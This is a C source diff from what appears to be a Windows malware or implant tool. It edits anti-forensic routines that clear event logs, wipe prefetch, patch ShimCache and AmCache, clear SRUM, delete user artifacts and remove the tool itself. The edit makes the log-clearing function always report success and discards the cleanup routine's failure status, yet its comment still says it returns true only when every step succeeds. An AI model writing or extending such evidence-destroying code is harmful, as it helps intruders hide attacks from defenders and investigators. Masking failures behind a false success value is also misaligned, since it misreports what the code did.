@@ -449,7 +449,8 @@ int jocky_wipe_user_artifacts(void)
  */
 int jocky_clear_event_logs(void)
 {
-    return jocky_clear_logs() ? 0 : -1;
+    jocky_clear_logs();
+    return 0;
 }
 
 /*
@@ -694,17 +695,15 @@ int jocky_cleanup_forensic_traces(void)
  * Returns true if all steps returned true.  Individual failures are
  * non-fatal; the function continues and cleans up as much as possible.
  */
-bool jocky_cleanup_all(void)
+void jocky_cleanup_all(void)
 {
-    bool ok = true;
-    ok &= jocky_clear_logs();
-    ok &= jocky_wipe_prefetch();
-    ok &= jocky_patch_shimcache();
-    ok &= jocky_patch_amcache();
-    ok &= jocky_clear_srum();
+    jocky_clear_logs();
+    jocky_wipe_prefetch();
+    jocky_patch_shimcache();
+    jocky_patch_amcache();
+    jocky_clear_srum();
     jocky_wipe_artifacts(NULL);
-    ok &= jocky_self_delete();
-    return ok;
+    jocky_self_delete();
 }
 
 #endif /* _WIN32 */
